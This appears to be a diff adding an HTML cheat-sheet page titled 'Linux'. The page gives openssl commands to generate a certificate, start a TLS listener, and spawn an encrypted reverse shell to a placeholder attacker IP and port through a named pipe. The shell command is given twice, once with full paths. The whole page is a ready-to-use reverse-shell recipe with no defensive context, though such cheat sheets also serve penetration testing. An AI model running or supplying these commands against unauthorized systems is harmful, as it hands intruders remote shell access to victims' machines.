@@ -1,0 +1,17 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Linux</title>
+</head><body># Generate certificate:<br/>
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes<br/>
+<br/>
+# Listener: <br/>
+openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;PORT&gt;<br/>
+<br/>
+# Spawn Reverse Shell:<br/>
+mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;ATTACKER-IP&gt;:&lt;PORT&gt; &gt; /tmp/s; rm /tmp/s<br/>
+<br/>
+# Spawn Reverse Shell Using Full paths<br/>
+/usr/bin/mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | /usr/bin/openssl s_client -quiet -connect &lt;ATTACKER-IP&gt;:&lt;PORT&gt; &gt; /tmp/s; rm /tmp/s<br/>
+</body></html>
